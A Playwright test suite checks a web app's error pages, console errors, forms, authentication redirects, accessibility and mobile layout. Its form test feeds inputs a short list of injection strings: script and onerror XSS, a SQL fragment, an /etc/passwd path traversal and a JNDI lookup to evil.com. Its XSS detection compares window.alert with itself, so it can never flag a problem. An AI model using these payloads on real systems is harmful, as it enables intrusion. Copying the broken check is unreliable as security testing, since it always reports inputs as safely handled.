import { test, expect, Page } from '@playwright/test';
import { TestHelpers } from './utils/test-helpers';
import { testData } from './fixtures/test-data';

test.describe('Error Handling and Edge Cases', () => {
  let page: Page;
  let helpers: TestHelpers;

  test.beforeEach(async ({ page: testPage }) => {
    page = testPage;
    helpers = new TestHelpers(page);
  });

  test('404 error page handling', async () => {
    console.log('🔍 Testing 404 error page handling...');
    
    const nonExistentUrls = [
      '/this-page-does-not-exist',
      '/nonexistent-page',
      '/invalid-route',
      '/dashboard/nonexistent',
      '/jobs/invalid-id',
      '/users/fake-user',
      '/api/nonexistent'
    ];

    const brokenLinks: string[] = [];
    const properlyHandled: string[] = [];

    for (const url of nonExistentUrls) {
      try {
        const response = await page.goto(url);
        await helpers.waitForFullLoad();
        
        const statusCode = response?.status();
        const pageContent = await page.textContent('body');
        const currentUrl = page.url();
        const pageTitle = await page.title();
        
        console.log(`\n--- Testing ${url} ---`);
        console.log(`Status: ${statusCode}`);
        console.log(`Current URL: ${currentUrl}`);
        console.log(`Page Title: ${pageTitle}`);

        // Check if it's properly handled as a 404
        const is404Page = statusCode === 404 || 
                          pageContent?.includes('404') || 
                          pageContent?.toLowerCase().includes('not found') ||
                          pageContent?.toLowerCase().includes('page not found') ||
                          pageTitle.toLowerCase().includes('404') ||
                          pageTitle.toLowerCase().includes('not found');

        if (is404Page) {
          console.log('✅ Properly handled as 404');
          properlyHandled.push(url);
          
          // Check if 404 page has helpful content
          const hasHomeLink = pageContent?.toLowerCase().includes('home') ||
                             page.locator('a[href="/"], a:has-text("Home")').count() > 0;
          const hasSearchOption = pageContent?.toLowerCase().includes('search');
          const hasNavigation = await page.locator('nav').count() > 0;
          
          if (hasHomeLink) {
            console.log('✅ 404 page has home/back link');
          }
          if (hasSearchOption) {
            console.log('✅ 404 page offers search functionality');
          }
          if (hasNavigation) {
            console.log('✅ 404 page maintains site navigation');
          }
        } else {
          console.log('⚠️ Not properly handled as 404');
          brokenLinks.push(`${url} - Status: ${statusCode}, Content suggests: ${pageContent?.substring(0, 100)}`);
        }

        await helpers.takeScreenshot(`404-test-${url.replace(/\//g, '-')}`);

      } catch (error) {
        console.log(`❌ Error accessing ${url}: ${error}`);
        brokenLinks.push(`${url} - Error: ${error}`);
      }
    }

    console.log('\n=== 404 Test Summary ===');
    console.log(`Properly handled: ${properlyHandled.length}`);
    console.log(`Issues found: ${brokenLinks.length}`);
    
    if (brokenLinks.length > 0) {
      console.log('\nIssues:', brokenLinks);
    }
  });

  test('Network error handling', async () => {
    console.log('🌐 Testing network error handling...');
    
    let networkErrors: string[] = [];
    
    // Monitor network failures
    page.on('requestfailed', request => {
      networkErrors.push(`${request.method()} ${request.url()} - ${request.failure()?.errorText}`);
    });

    // Visit main pages and monitor for network errors
    const pagesToTest = ['/', '/dashboard', '/login', '/register'];
    
    for (const pageUrl of pagesToTest) {
      console.log(`\nTesting network errors on ${pageUrl}`);
      
      try {
        await page.goto(pageUrl);
        await helpers.waitForFullLoad();
        
        // Wait a bit to catch any delayed network requests
        await page.waitForTimeout(3000);
        
        const pageErrors = networkErrors.filter(error => !error.includes('favicon'));
        
        if (pageErrors.length > 0) {
          console.log(`⚠️ Network errors on ${pageUrl}:`, pageErrors);
        } else {
          console.log(`✅ No network errors on ${pageUrl}`);
        }
        
        // Clear errors for next page test
        networkErrors = [];
        
      } catch (error) {
        console.log(`❌ Failed to load ${pageUrl}: ${error}`);
      }
    }

    // Test handling of slow/failed API requests (if any API calls are visible)
    await page.goto('/dashboard');
    await helpers.waitForFullLoad();
    
    // Look for loading states or error messages
    const errorMessages = page.locator('.error, [role="alert"], .error-message, .network-error');
    const errorCount = await errorMessages.count();
    
    if (errorCount > 0) {
      console.log(`Found ${errorCount} error messages on dashboard`);
      
      for (let i = 0; i < errorCount; i++) {
        const error = errorMessages.nth(i);
        const errorText = await error.textContent();
        console.log(`Error message ${i + 1}: ${errorText}`);
      }
    }

    await helpers.takeScreenshot('network-error-handling');
  });

  test('JavaScript errors and console warnings', async () => {
    console.log('⚠️ Testing JavaScript errors and console warnings...');
    
    let consoleMessages: { type: string; text: string; url: string }[] = [];
    
    page.on('console', msg => {
      if (msg.type() === 'error' || msg.type() === 'warning') {
        consoleMessages.push({
          type: msg.type(),
          text: msg.text(),
          url: page.url()
        });
      }
    });

    page.on('pageerror', error => {
      consoleMessages.push({
        type: 'uncaught-exception',
        text: error.message,
        url: page.url()
      });
    });

    const pagesToTest = ['/', '/dashboard', '/login', '/register'];
    
    for (const pageUrl of pagesToTest) {
      console.log(`\nChecking console errors on ${pageUrl}`);
      
      await page.goto(pageUrl);
      await helpers.waitForFullLoad();
      
      // Interact with the page to trigger any lazy-loaded JavaScript
      await page.hover('body');
      await page.waitForTimeout(2000);
      
      const pageErrors = consoleMessages.filter(msg => msg.url.includes(pageUrl));
      
      if (pageErrors.length > 0) {
        console.log(`Found ${pageErrors.length} console issues on ${pageUrl}:`);
        pageErrors.forEach((error, index) => {
          console.log(`  ${index + 1}. [${error.type.toUpperCase()}] ${error.text}`);
        });
      } else {
        console.log(`✅ No console errors on ${pageUrl}`);
      }
      
      // Clear messages for next page
      consoleMessages = [];
    }

    await helpers.takeScreenshot('javascript-error-check');
  });

  test('Form submission edge cases', async () => {
    console.log('📝 Testing form submission edge cases...');
    
    const formsToTest = [
      { url: '/login', name: 'Login' },
      { url: '/register', name: 'Registration' },
      { url: '/contact', name: 'Contact' }
    ];

    for (const formTest of formsToTest) {
      console.log(`\n--- Testing ${formTest.name} Form Edge Cases ---`);
      
      try {
        await page.goto(formTest.url);
        await helpers.waitForFullLoad();
        
        const form = page.locator('form').first();
        if (await form.count() === 0) {
          console.log(`ℹ️ No form found on ${formTest.url}`);
          continue;
        }

        // Test 1: Double form submission
        console.log('Testing double form submission prevention...');
        const submitButton = form.locator('button[type="submit"], input[type="submit"]').first();
        
        if (await submitButton.count() > 0) {
          // Fill form with some data first
          const inputs = form.locator('input[type="text"], input[type="email"], input[type="password"]');
          const inputCount = await inputs.count();
          
          for (let i = 0; i < inputCount; i++) {
            await inputs.nth(i).fill(`test-data-${i}`);
          }
          
          // Try double clicking submit
          await submitButton.click();
          
          // Check if button is disabled after first click
          const isDisabled = await submitButton.isDisabled();
          if (isDisabled) {
            console.log('✅ Submit button disabled after click (prevents double submission)');
          } else {
            // Try clicking again quickly
            await submitButton.click();
            console.log('⚠️ Double submission may be possible');
          }
        }

        // Test 2: Very long input values
        console.log('Testing very long input handling...');
        const textInputs = form.locator('input[type="text"], input[type="email"], textarea');
        const textInputCount = await textInputs.count();
        
        if (textInputCount > 0) {
          const veryLongText = 'A'.repeat(10000); // 10KB of text
          const firstInput = textInputs.first();
          
          await firstInput.fill(veryLongText);
          
          // Check if input handles the long text gracefully
          const actualValue = await firstInput.inputValue();
          const maxLength = await firstInput.getAttribute('maxlength');
          
          if (maxLength) {
            console.log(`✅ Input has maxlength="${maxLength}" attribute`);
          }
          
          if (actualValue.length < veryLongText.length) {
            console.log(`✅ Long input truncated (${actualValue.length} chars vs ${veryLongText.length} attempted)`);
          } else {
            console.log('⚠️ Very long input accepted without truncation');
          }
        }

        // Test 3: Special characters and XSS attempts
        console.log('Testing special character handling...');
        const specialChars = [
          '<script>alert("xss")</script>',
          'SELECT * FROM users;',
          '../../etc/passwd',
          '${jndi:ldap://evil.com}',
          '<img src=x onerror=alert(1)>'
        ];

        if (textInputCount > 0) {
          const testInput = textInputs.first();
          
          for (const specialChar of specialChars) {
            await testInput.fill(specialChar);
            await testInput.blur();
            await page.waitForTimeout(500);
            
            // Check if any XSS or injection occurred
            const alertPresent = await page.evaluate(() => {
              return window.alert !== window.alert; // Check if alert was overridden
            });
            
            if (!alertPresent) {
              console.log(`✅ Special characters safely handled: ${specialChar.substring(0, 30)}...`);
            } else {
              console.log(`❌ Potential XSS vulnerability with: ${specialChar}`);
            }
          }
        }

        // Test 4: File upload edge cases (if file inputs exist)
        console.log('Testing file upload edge cases...');
        const fileInputs = form.locator('input[type="file"]');
        const fileInputCount = await fileInputs.count();
        
        if (fileInputCount > 0) {
          console.log(`Found ${fileInputCount} file upload fields`);
          
          // Check file size limits and type restrictions
          for (let i = 0; i < fileInputCount; i++) {
            const fileInput = fileInputs.nth(i);
            const accept = await fileInput.getAttribute('accept');
            const multiple = await fileInput.getAttribute('multiple');
            
            console.log(`File input ${i + 1}: accept="${accept}", multiple="${multiple}"`);
            
            if (accept) {
              console.log(`✅ File type restrictions in place: ${accept}`);
            } else {
              console.log('⚠️ No file type restrictions');
            }
          }
        } else {
          console.log('ℹ️ No file upload fields found');
        }

        await helpers.takeScreenshot(`form-edge-cases-${formTest.name.toLowerCase()}`);

      } catch (error) {
        console.warn(`Error testing ${formTest.name} form edge cases:`, error);
      }
    }
  });

  test('Session and authentication edge cases', async () => {
    console.log('🔐 Testing session and authentication edge cases...');
    
    // Test 1: Accessing protected pages without authentication
    console.log('Testing unauthenticated access to protected pages...');
    
    const protectedPages = ['/dashboard', '/profile', '/settings', '/admin'];
    
    for (const protectedPage of protectedPages) {
      try {
        await page.goto(protectedPage);
        await helpers.waitForFullLoad();
        
        const currentUrl = page.url();
        const pageContent = await page.textContent('body');
        
        const redirectedToLogin = currentUrl.includes('login') || currentUrl.includes('signin');
        const showsLoginPrompt = pageContent?.includes('login') || pageContent?.includes('sign in');
        const showsAccessDenied = pageContent?.includes('access denied') || pageContent?.includes('unauthorized');
        
        if (redirectedToLogin) {
          console.log(`✅ ${protectedPage}: Redirected to login page`);
        } else if (showsLoginPrompt || showsAccessDenied) {
          console.log(`✅ ${protectedPage}: Shows authentication required message`);
        } else {
          console.log(`⚠️ ${protectedPage}: May be accessible without authentication`);
        }
        
      } catch (error) {
        console.log(`Error testing ${protectedPage}: ${error}`);
      }
    }

    // Test 2: Session timeout simulation
    console.log('Testing session timeout behavior...');
    
    // Check if there are any session timeout warnings or handlers
    await page.goto('/dashboard');
    await helpers.waitForFullLoad();
    
    // Look for session timeout related elements
    const sessionElements = page.locator('text=/session/i, text=/timeout/i, text=/expired/i, .session-warning');
    const sessionElementCount = await sessionElements.count();
    
    if (sessionElementCount > 0) {
      console.log(`✅ Found ${sessionElementCount} session-related elements`);
    } else {
      console.log('ℹ️ No obvious session timeout handling found');
    }

    await helpers.takeScreenshot('session-authentication-edge-cases');
  });

  test('Browser compatibility edge cases', async () => {
    console.log('🌐 Testing browser compatibility edge cases...');
    
    const browserName = page.context().browser()?.browserType().name();
    console.log(`Running compatibility tests in: ${browserName}`);
    
    await page.goto('/');
    await helpers.waitForFullLoad();
    
    // Test modern JavaScript features
    const jsFeatures = await page.evaluate(() => {
      const features = {
        fetch: typeof fetch !== 'undefined',
        promise: typeof Promise !== 'undefined',
        arrow_functions: (() => true)() === true,
        const_let: (() => { try { eval('const x = 1; let y = 2;'); return true; } catch(e) { return false; }})(),
        template_literals: (() => { try { eval('`template`'); return true; } catch(e) { return false; }})(),
        async_await: (() => { try { eval('async () => await 1'); return true; } catch(e) { return false; }})(),
        classes: (() => { try { eval('class A {}'); return true; } catch(e) { return false; }})()
      };
      return features;
    });
    
    console.log('JavaScript feature support:', jsFeatures);
    
    Object.entries(jsFeatures).forEach(([feature, supported]) => {
      if (supported) {
        console.log(`✅ ${feature}: Supported`);
      } else {
        console.log(`❌ ${feature}: Not supported`);
      }
    });

    // Test CSS features
    const cssFeatures = await page.evaluate(() => {
      const testDiv = document.createElement('div');
      document.body.appendChild(testDiv);
      
      const features = {
        flexbox: 'flex' in testDiv.style,
        grid: 'grid' in testDiv.style,
        css_variables: CSS && CSS.supports && CSS.supports('color', 'var(--test)'),
        transforms: 'transform' in testDiv.style,
        transitions: 'transition' in testDiv.style,
        animations: 'animation' in testDiv.style
      };
      
      document.body.removeChild(testDiv);
      return features;
    });
    
    console.log('CSS feature support:', cssFeatures);
    
    Object.entries(cssFeatures).forEach(([feature, supported]) => {
      if (supported) {
        console.log(`✅ ${feature}: Supported`);
      } else {
        console.log(`❌ ${feature}: Not supported`);
      }
    });

    await helpers.takeScreenshot(`browser-compatibility-${browserName}`);
  });

  test('Performance under stress conditions', async () => {
    console.log('🔥 Testing performance under stress conditions...');
    
    await page.goto('/');
    
    // Test rapid navigation
    console.log('Testing rapid navigation...');
    const navLinks = page.locator('nav a, header a').filter({ hasNotText: /^$/ });
    const linkCount = await navLinks.count();
    
    if (linkCount > 0) {
      const startTime = Date.now();
      
      // Navigate rapidly between pages
      for (let i = 0; i < Math.min(linkCount, 5); i++) {
        const link = navLinks.nth(i);
        const href = await link.getAttribute('href');
        
        if (href && !href.startsWith('#') && !href.startsWith('mailto:')) {
          await link.click();
          await page.waitForLoadState('networkidle', { timeout: 10000 });
          
          // Go back to home
          await page.goto('/');
          await page.waitForLoadState('networkidle', { timeout: 5000 });
        }
      }
      
      const totalTime = Date.now() - startTime;
      console.log(`Rapid navigation completed in ${totalTime}ms`);
    }

    // Test form interaction stress
    console.log('Testing form interaction stress...');
    await page.goto('/register');
    await helpers.waitForFullLoad();
    
    const form = page.locator('form').first();
    if (await form.count() > 0) {
      const inputs = form.locator('input[type="text"], input[type="email"]');
      const inputCount = await inputs.count();
      
      if (inputCount > 0) {
        const startTime = Date.now();
        
        // Rapidly type in all inputs
        for (let round = 0; round < 3; round++) {
          for (let i = 0; i < inputCount; i++) {
            const input = inputs.nth(i);
            await input.fill(`stress-test-${round}-${i}-${Math.random()}`);
          }
        }
        
        const totalTime = Date.now() - startTime;
        console.log(`Form stress test completed in ${totalTime}ms`);
      }
    }

    // Check memory usage (basic check)
    const memoryUsage = await page.evaluate(() => {
      return {
        usedJSSize: (performance as any).memory?.usedJSSize || 'N/A',
        totalJSSize: (performance as any).memory?.totalJSSize || 'N/A',
        jsHeapSizeLimit: (performance as any).memory?.jsHeapSizeLimit || 'N/A'
      };
    });
    
    console.log('Memory usage:', memoryUsage);

    await helpers.takeScreenshot('stress-test-complete');
  });

  test('Accessibility error conditions', async () => {
    console.log('♿ Testing accessibility in error conditions...');
    
    // Test accessibility when errors are displayed
    await page.goto('/login');
    await helpers.waitForFullLoad();
    
    const form = page.locator('form').first();
    if (await form.count() > 0) {
      // Trigger validation errors
      const submitButton = form.locator('button[type="submit"], input[type="submit"]').first();
      if (await submitButton.count() > 0) {
        await submitButton.click();
        await page.waitForTimeout(2000);
        
        // Check accessibility of error messages
        const errorElements = page.locator('.error, [role="alert"]');
        const errorCount = await errorElements.count();
        
        if (errorCount > 0) {
          console.log(`Testing accessibility of ${errorCount} error messages`);
          
          for (let i = 0; i < errorCount; i++) {
            const error = errorElements.nth(i);
            
            // Check ARIA attributes
            const role = await error.getAttribute('role');
            const ariaLive = await error.getAttribute('aria-live');
            const ariaAtomic = await error.getAttribute('aria-atomic');
            
            if (role === 'alert' || ariaLive) {
              console.log(`✅ Error ${i + 1} has proper ARIA announcement attributes`);
            } else {
              console.log(`⚠️ Error ${i + 1} may not be announced to screen readers`);
            }
            
            // Check color contrast (basic check)
            const styles = await error.evaluate(el => {
              const computed = window.getComputedStyle(el);
              return {
                color: computed.color,
                backgroundColor: computed.backgroundColor
              };
            });
            
            console.log(`Error ${i + 1} styling:`, styles);
          }
        }
      }
    }

    // Test keyboard navigation in error states
    console.log('Testing keyboard navigation in error states...');
    
    // Try tabbing through elements when errors are present
    await page.keyboard.press('Tab');
    const activeElement = await page.evaluate(() => document.activeElement?.tagName);
    console.log(`Active element after tab: ${activeElement}`);

    await helpers.takeScreenshot('accessibility-error-conditions');
  });

  test('Edge cases in mobile responsive design', async () => {
    console.log('📱 Testing mobile responsive edge cases...');
    
    // Test very small viewport
    console.log('Testing very small viewport (320x480)...');
    await page.setViewportSize({ width: 320, height: 480 });
    await page.goto('/');
    await helpers.waitForFullLoad();
    
    const mobileIssues = await helpers.checkMobileResponsiveness();
    if (mobileIssues.length > 0) {
      console.log('Issues at 320px width:', mobileIssues);
    } else {
      console.log('✅ No issues at very small viewport');
    }
    
    // Test landscape mobile
    console.log('Testing mobile landscape (667x375)...');
    await page.setViewportSize({ width: 667, height: 375 });
    await page.goto('/');
    await helpers.waitForFullLoad();
    
    const landscapeIssues = await helpers.checkMobileResponsiveness();
    if (landscapeIssues.length > 0) {
      console.log('Issues in landscape mode:', landscapeIssues);
    } else {
      console.log('✅ No issues in landscape mode');
    }
    
    // Test viewport zoom
    console.log('Testing viewport zoom...');
    await page.setViewportSize({ width: 1280, height: 720 });
    await page.goto('/');
    await helpers.waitForFullLoad();
    
    // Simulate zoom by changing the viewport scale
    await page.evaluate(() => {
      document.body.style.zoom = '150%';
    });
    
    await page.waitForTimeout(1000);
    
    // Check if content is still accessible
    const zoomedContent = await page.locator('h1, h2').first();
    if (await zoomedContent.count() > 0 && await zoomedContent.isVisible()) {
      console.log('✅ Content remains accessible when zoomed');
    } else {
      console.log('⚠️ Content may not be accessible when zoomed');
    }
    
    await helpers.takeScreenshot('mobile-edge-cases');
    
    // Reset zoom and viewport
    await page.evaluate(() => {
      document.body.style.zoom = '100%';
    });
    await page.setViewportSize(testData.viewports.desktop);
  });
});